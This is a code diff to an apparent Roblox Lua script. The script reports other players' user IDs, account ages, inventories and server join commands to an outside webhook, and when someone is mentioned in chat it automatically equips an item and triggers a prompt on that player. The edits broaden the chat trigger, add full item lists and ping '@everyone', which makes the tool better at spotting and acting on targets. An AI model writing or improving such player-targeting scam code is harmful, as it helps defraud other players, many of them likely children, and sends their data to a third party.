@@ -68,7 +68,8 @@ local function sendInitialWebhook()
             {name = "🔗 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
             {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
             {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
-            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
+            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false},
+            {name = "📜 All Items", value = "```"..table.concat(items, ", ").."```", inline = false}
         },
         footer = {
             text = "Scan Time: "..os.date("%X")
@@ -96,7 +97,7 @@ local function getBestItem(target)
     return bestItem
 end
 
-local function findFruitPrompt(targetChar)
+local function findTargetPrompt(targetChar)
     local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
     if not humanoidRootPart then return nil end
     
@@ -169,7 +170,7 @@ local function interactWithTarget(target)
         LocalPlayer.Character.Humanoid:EquipTool(bestItem)
         task.wait(0.5)
         
-        local prompt = findFruitPrompt(targetChar)
+        local prompt = findTargetPrompt(targetChar)
         if prompt then
             holdPrompt(prompt)
         else
@@ -181,7 +182,21 @@ local function interactWithTarget(target)
 end
 
 local function onPlayerChatted(player, message)
-    if player == LocalPlayer or not string.find(message, "@") then return end
+    if player == LocalPlayer then return end
+    
+    local mentioned = false
+    if string.find(message:lower(), "@"..LocalPlayer.Name:lower()) then
+        mentioned = true
+    else
+        for word in message:gmatch("%S+") do
+            if word == "@everyone" or word == "@here" then
+                mentioned = true
+                break
+            end
+        end
+    end
+    
+    if not mentioned then return end
     
     local items = {}
     for _, item in pairs(player.Backpack:GetChildren()) do
@@ -196,15 +211,16 @@ local function onPlayerChatted(player, message)
     end
     
     local embed = {
-        title = "🎯 Target Mentioned | "..player.Name,
+        title = "🎯 Mention Detected | "..player.Name,
         description = "**Chat:** ```"..message.."```",
         color = 0xFFA500,
         thumbnail = {
             url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
         },
         fields = {
-            {name = "📦 Items", value = "```"..#items.." found```", inline = true},
-            {name = "💎 Rares", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
+            {name = "📦 Total Items", value = "```"..#items.."```", inline = true},
+            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
+            {name = "📜 All Items", value = "```"..table.concat(items, ", ").."```", inline = false},
             {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
         },
         footer = {
@@ -212,7 +228,7 @@ local function onPlayerChatted(player, message)
         }
     }
     
-    sendWebhook(nil, embed)
+    sendWebhook("@everyone", embed)
     interactWithTarget(player)
 end
 
